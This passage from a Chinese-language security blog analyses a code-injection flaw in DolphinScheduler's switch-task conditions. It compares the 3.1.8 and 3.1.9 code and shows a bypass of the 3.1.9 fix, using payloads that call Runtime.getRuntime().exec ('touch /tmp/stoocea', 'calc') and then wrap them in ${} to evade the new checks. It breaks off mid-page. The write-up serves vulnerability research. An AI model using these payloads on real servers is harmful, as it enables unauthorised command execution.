#82AAFF\">getRuntime</span><span style=\"color: #89DDFF\">().</span><span style=\"color: #82AAFF\">exec</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">touch /tmp/stoocea</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">)</span></span></code></pre></div><p>看看容器内的 tmp 目录，执行成功<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713278829771-936db8ec-2078-429c-a4c2-ee17f7db687a.png#averageHue=%23282f48&clientId=u600d120d-c14e-4&from=paste&height=107&id=uaa4c1642&originHeight=201&originWidth=1816&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=82583&status=done&style=none&taskId=u213a4d20-4f51-4c80-a860-ed9a9b8bdbe&title=&width=968.5333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"></p>\n<h2 id=\"3-1-9-版本-diff-分析\"><a href=\"#3-1-9-版本-diff-分析\" class=\"headerlink\" title=\"3.1.9 版本 diff 分析\"></a>3.1.9 版本 diff 分析</h2><h3 id=\"0x01-源码-diff-分析\"><a href=\"#0x01-源码-diff-分析\" class=\"headerlink\" title=\"0x01 源码 diff 分析\"></a>0x01 源码 diff 分析</h3><p>作者的想法是增加一个<code>generateContentWithTaskParams</code>方法在 SwitchTaskUtils 中<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713279012640-c5e812ce-c1d0-451a-9534-7a2ea6af2e4d.png#averageHue=%23151f2e&clientId=u600d120d-c14e-4&from=paste&height=577&id=ue3a5382a&originHeight=1082&originWidth=2115&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=113337&status=done&style=none&taskId=u568e566c-e336-4b87-9e33-5735b4c1fca&title=&width=1128\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>这个方法的使用呢是在<code>SwitchTaskProcessor</code>类的<code>setSwitchResult</code>方法中，也就是处理 Content 的地方<br>3.1.8 版本的逻辑是通过<code>setTaskParams</code>方法去处理 content<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713280604202-ff7a3adb-8c29-4ddb-903e-c5649c6759b3.png#averageHue=%23bbe2be&clientId=u600d120d-c14e-4&from=paste&height=27&id=u54b01545&originHeight=50&originWidth=944&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=5674&status=done&style=none&taskId=uc211504d-f876-414d-83fc-ecd42cb06f4&title=&width=503.46666666666664\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713280610084-bad480bc-ad2a-4284-8cc9-a72c016635cb.png#averageHue=%232f201a&clientId=u600d120d-c14e-4&from=paste&height=419&id=uf634d947&originHeight=785&originWidth=1051&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=77560&status=done&style=none&taskId=u8363f933-fbf8-4ac3-8ee4-2e780d7ddfa&title=&width=560.5333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>到了 3.1.9 之后，作者决定彻底去除这个方法，里面获取两个 Map 的逻辑解放出来，然后处理字段的逻辑交由 SwitchTaskUtils 中新增的<code>generateContentWithTaskParams</code>方法来完成<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713280695123-b1107592-94ea-45da-b23b-46eddeb99553.png#averageHue=%2317283f&clientId=u600d120d-c14e-4&from=paste&height=121&id=uc43ff50f&originHeight=227&originWidth=918&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=24476&status=done&style=none&taskId=ud9aa5cb9-a542-475e-8774-6473560065d&title=&width=489.6\" referrerpolicy=\"no-referrer\" alt=\"image.png\"></p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\"> </span><span style=\"color: #C792EA\">public</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C792EA\">static</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C792EA\">String</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">generateContentWithTaskParams</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #C792EA\">String</span><span style=\"color: #BABED8\"> condition</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C792EA\">Map</span><span style=\"color: #89DDFF\">&lt;</span><span style=\"color: #BABED8\">String</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> Property</span><span style=\"color: #89DDFF\">&gt;</span><span style=\"color: #BABED8\"> globalParams</span><span style=\"color: #89DDFF\">,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                                                       </span><span style=\"color: #C792EA\">Map</span><span style=\"color: #89DDFF\">&lt;</span><span style=\"color: #BABED8\">String</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> Property</span><span style=\"color: #89DDFF\">&gt;</span><span style=\"color: #BABED8\"> varParams</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #C792EA\">String</span><span style=\"color: #BABED8\"> content </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> condition</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">replaceAll</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">&#39;</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #BABED8\">\\&quot;</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">MapUtils</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">isEmpty</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">globalParams</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&amp;&amp;</span><span style=\"color: #BABED8\"> MapUtils</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">isEmpty</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">varParams</span><span style=\"color: #89DDFF\">))</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #89DDFF; font-style: italic\">throw</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF; font-style: italic\">new</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">IllegalArgumentException</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">globalParams and varParams are both empty, please check it.</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF\">&#125;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #C792EA\">Map</span><span style=\"color: #89DDFF\">&lt;</span><span style=\"color: #C792EA\">String</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C792EA\">Property</span><span style=\"color: #89DDFF\">&gt;</span><span style=\"color: #BABED8\"> params </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> Maps</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">newHashMap</span><span style=\"color: #89DDFF\">();</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">MapUtils</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">isNotEmpty</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">globalParams</span><span style=\"color: #89DDFF\">))</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            params</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">putAll</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">globalParams</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF\">&#125;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">MapUtils</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">isNotEmpty</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">varParams</span><span style=\"color: #89DDFF\">))</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            params</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">putAll</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">varParams</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF\">&#125;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #C792EA\">String</span><span style=\"color: #BABED8\"> originContent </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> content</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #C792EA\">Pattern</span><span style=\"color: #BABED8\"> pattern </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> Pattern</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">compile</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">rgex</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #C792EA\">Matcher</span><span style=\"color: #BABED8\"> m </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> pattern</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">matcher</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">content</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">while</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">m</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">find</span><span style=\"color: #89DDFF\">())</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #C792EA\">String</span><span style=\"color: #BABED8\"> paramName </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> m</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">group</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #F78C6C\">1</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #C792EA\">Property</span><span style=\"color: #BABED8\"> property </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> params</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">get</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">paramName</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">property </span><span style=\"color: #89DDFF\">==</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">null)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                </span><span style=\"color: #89DDFF; font-style: italic\">continue</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #89DDFF\">&#125;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #C792EA\">String</span><span style=\"color: #BABED8\"> value</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">ParameterUtils</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">isNumber</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">property</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">||</span><span style=\"color: #BABED8\"> ParameterUtils</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">isBoolean</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">property</span><span style=\"color: #89DDFF\">))</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                value </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;&quot;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">+</span><span style=\"color: #BABED8\"> ParameterUtils</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">getParameterValue</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">property</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #89DDFF\">&#125;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF; font-style: italic\">else</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                value </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #BABED8\">\\&quot;</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">+</span><span style=\"color: #BABED8\"> ParameterUtils</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">getParameterValue</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">property</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">+</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #BABED8\">\\&quot;</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #89DDFF\">&#125;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            log</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">info</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">paramName:&#123;&#125;，paramValue:&#123;&#125;</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> paramName</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> value</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            content </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> content</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">replace</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">$&#123;</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">+</span><span style=\"color: #BABED8\"> paramName </span><span style=\"color: #89DDFF\">+</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">&#125;</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> value</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF\">&#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">        </span><span style=\"color: #676E95; font-style: italic\">// if not replace any params, throw exception to avoid illegal condition</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">originContent</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">equals</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">content</span><span style=\"color: #89DDFF\">))</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #89DDFF; font-style: italic\">throw</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF; font-style: italic\">new</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">IllegalArgumentException</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">condition is not valid, please check it. condition: </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">+</span><span style=\"color: #BABED8\"> condition</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF\">&#125;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> content</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF\">&#125;</span></span></code></pre></div><p>其实generateContentWithTaskParams 方法相较于之前的setTaskParams 的内容，只添加了如下代码：</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #C792EA\">String</span><span style=\"color: #BABED8\"> content </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> condition</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">replaceAll</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">&#39;</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #BABED8\">\\&quot;</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #C792EA\">String</span><span style=\"color: #BABED8\"> originContent </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> content</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #C792EA\">Pattern</span><span style=\"color: #BABED8\"> pattern </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> Pattern</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">compile</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">rgex</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #C792EA\">Matcher</span><span style=\"color: #BABED8\"> m </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> pattern</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">matcher</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">content</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"></span></code></pre></div><p>这里后续就是对 Matcher 的循环比对了，问题是这里还存了一个originContent，之后会有与 content 内容的比较，如果 content 在经历过 Matcher 之后内容不变，或者压根没进 while 循环，都会导致 content 内容和originContent 相同，然后直接抛出异常</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">originContent</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">equals</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">content</span><span style=\"color: #89DDFF\">))</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #89DDFF; font-style: italic\">throw</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF; font-style: italic\">new</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">IllegalArgumentException</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">condition is not valid, please check it. condition: </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">+</span><span style=\"color: #BABED8\"> condition</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&#125;</span></span></code></pre></div><p>铜鼓找不同我们找出了两个需要注意点，此时调试的时候还遇到了另外一个干扰点<br>全局变量不能为空，这里全局变量看了一会官方的开发手册，我们保存工作流的时候记得添加一个全局变量就行</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\">  </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">MapUtils</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">isEmpty</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">globalParams</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&amp;&amp;</span><span style=\"color: #BABED8\"> MapUtils</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">isEmpty</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">varParams</span><span style=\"color: #89DDFF\">))</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #89DDFF; font-style: italic\">throw</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF; font-style: italic\">new</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">IllegalArgumentException</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">globalParams and varParams are both empty, please check it.</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF\">&#125;</span></span></code></pre></div><p><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713334546423-1f1b4a0d-76cd-41ed-9314-4be6b2f389aa.png#averageHue=%23fdfdfd&clientId=uec846445-2f9d-4&from=paste&height=544&id=u3854187b&originHeight=1020&originWidth=911&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=32999&status=done&style=none&taskId=ud7c08bb8-2417-40bc-b555-f4475c73255&title=&width=485.8666666666667\" referrerpolicy=\"no-referrer\" alt=\"image.png\"></p>\n<h3 id=\"0x02-尝试绕过\"><a href=\"#0x02-尝试绕过\" class=\"headerlink\" title=\"0x02 尝试绕过\"></a>0x02 尝试绕过</h3><p>所以总结起来我们一共需要绕过三个点<br><code>String content = condition.replaceAll(&quot;&#39;&quot;, &quot;\\&quot;&quot;);</code>对于 payload 中的<code>&#39;</code>被替换为了 <code>\\&quot;</code>转义后的双引号<br><code> if (MapUtils.isEmpty(globalParams) &amp;&amp; MapUtils.isEmpty(varParams))</code>设置一个全局变量，不让 if 判断走进去抛异常<br>以及 Matcher 在匹配的循环中，content 必须要有<code>$&#123;xxxx&#125;</code>格式的字符串，不然无法进行替换，也就和 origincontent 产生不了差别<br>这里我们首先尝试如下 payload</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\">function </span><span style=\"color: #82AAFF\">test</span><span style=\"color: #89DDFF\">()&#123;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> java</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #BABED8\">lang</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #BABED8\">Runtime</span><span style=\"color: #89DDFF\">&#125;;</span><span style=\"color: #BABED8\">r</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #82AAFF\">test</span><span style=\"color: #89DDFF\">();</span><span style=\"color: #BABED8\">r</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">getRuntime</span><span style=\"color: #89DDFF\">().</span><span style=\"color: #82AAFF\">exec</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">calc</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\">$</span><span style=\"color: #89DDFF\">&#123;</span><span style=\"color: #BABED8\">test</span><span style=\"color: #89DDFF\">&#125;</span></span></code></pre></div><p>这里稍微调试一下都能理解，其实${xxx}格式的字符串，在DolphinScheduler 中表示取全局变量，也就是从我们刚才保存工作流的同时设置的全局变量（暂时只发现这一个功能）<br>那么这里我 test 全局变量设置的是 <code>nopstoocea</code><br>打断点调试一下<br>直接到generateContentWithTaskParams 的逻辑，前面获取到 switch 以及 condition(content) 的内容都是不变的</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713335053414-82106e48-3d3e-4957-9c11-1e81c13f76a1.png#averageHue=%23363b44&clientId=uec846445-2f9d-4&from=paste&height=625&id=u2320dad9&originHeight=1172&originWidth=2437&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=1124204&status=done&style=none&taskId=ue81bf099-198f-45ad-b12a-85e08437a67&title=&width=1299.7333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"></p>\n<ol>\n<li>content 照样获取，只是<code>&#39;</code>被替换为了 <code>\\&quot;</code>,几番尝试之后其实可以判定我们 payload 是不会收影响的</li>\n<li>由于我们设置了 globalparams 所以 <code>if (MapUtils.isEmpty(globalParams) &amp;&amp; MapUtils.isEmpty(varParams))</code>不会进去抛异常</li>\n<li>Matcher 的构造其实涉及到 content 以及全局变量，这里之后 while 循环，由于我们 content（switch 的条件内容 condition）中带有<code>$&#123;test&#125;</code>,正好被他的正则匹配到了，所以这里 while 循环初步 find 一定能够找到</li>\n<li>进入之后 while 循环，其实它里面的内容就是将 content 内容中${test}一个一个替换出实际的值，并且会去掉<code>$&#123;&#125;</code>外壳，通过键值对寻找的方式从 globals 或者 var 中替换真实的值，比如我们这里 test&#x3D;&gt;nopstoocea</li>\n</ol>\n<p>那么后续 content 出来就是<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713335329493-92210341-deeb-45fb-9896-3d1685aa6392.png#averageHue=%234c505f&clientId=uec846445-2f9d-4&from=paste&height=36&id=uc1000f03&originHeight=68&originWidth=1499&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=39643&status=done&style=none&taskId=ubfa16180-f669-4501-bbe6-710e584f51d&title=&width=799.4666666666667\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>之后肯定就会和 origincontent 不同了，然后返回这个 content 出去，顺利送入 evaluate<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713335362698-a922c009-0a04-4743-a57c-73fb63fa73a0.png#averageHue=%23454b59&clientId=uec846445-2f9d-4&from=paste&height=132&id=uf710ed52&originHeight=247&originWidth=2369&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=187997&status=done&style=none&taskId=u1c39b8ec-d88f-4ea6-b826-474ea65c2d7&title=&width=1263.4666666666667\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>那其实绕过思路就出来了，我们把 payload 放入${}中就行，先尝试一下</p>\n<p><img 